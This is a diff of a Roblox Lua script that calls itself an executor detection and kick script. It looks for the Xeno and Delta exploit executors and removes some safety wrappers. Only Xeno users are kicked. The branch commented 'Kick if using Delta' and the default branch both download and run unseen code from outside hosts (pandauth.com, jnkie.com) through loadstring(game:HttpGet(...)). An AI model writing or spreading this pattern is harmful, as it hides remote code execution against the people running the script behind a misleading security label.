@@ -1,37 +1,36 @@
 -- ==========================================
---  SAFE EXECUTOR DETECTION & KICK SCRIPT
+--  EXECUTOR DETECTION & KICK SCRIPT
 -- ==========================================
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Safe function call helper
-local function safeCall(fn)
-    if type(fn) == "function" then
-        local success, result = pcall(fn)
-        if success and type(result) == "string" then
-            return result
-        end
-    end
-    return nil
-end
-
--- Safely identify the current executor
+-- Function to identify the current executor name
 local function getExecutor()
-    -- 1. Check custom Xeno globals
-    if rawget(_G, "Xeno") ~= nil or (getgenv and rawget(getgenv(), "Xeno") ~= nil) then
+    -- Check custom Xeno globals (from XenoExecutor source)
+    if Xeno ~= nil or getgenv().Xeno ~= nil then
         return "Xeno"
     end
     
-    -- 2. Check custom Delta globals
-    if rawget(_G, "DELTA_LOADED") ~= nil or (getgenv and rawget(getgenv(), "DELTA_LOADED") ~= nil) then
+    -- Check custom Delta globals
+    if DELTA_LOADED ~= nil or getgenv().DELTA_LOADED ~= nil then
         return "Delta"
     end
 
-    -- 3. Safely call identifyexecutor if it exists
-    local name = safeCall(identifyexecutor) or safeCall(getexecutorname)
-    if name then
-        return name
+    -- Check via standard identifyexecutor()
+    if identifyexecutor then
+        local name = identifyexecutor()
+        if type(name) == "string" then
+            return name
+        end
+    end
+
+    -- Check via getexecutorname()
+    if getexecutorname then
+        local name = getexecutorname()
+        if type(name) == "string" then
+            return name
+        end
     end
 
     return "Unknown"
@@ -43,12 +42,15 @@ end
 
 local currentExecutor = getExecutor():lower()
 
+-- Scenario 1: Kick if using Delta
 if currentExecutor:find("delta") then
     loadstring(game:HttpGet("https://vss.pandauth.com/kv/fe63c15f40ddcfe2"))()
 
+-- Scenario 2: Kick if using Xeno Executor
 elseif currentExecutor:find("xeno") then
     LocalPlayer:Kick("\n[Security Alert]\nXeno Executor is not allowed in this game.")
 
+-- Scenario 3: Allowed Executor / Default Execution
 else
     loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/eb70e01a85a92c98ca0e54a9bb5a2474cef55eef9f2d0aa76aa086e6217f7453/download"))()
 end
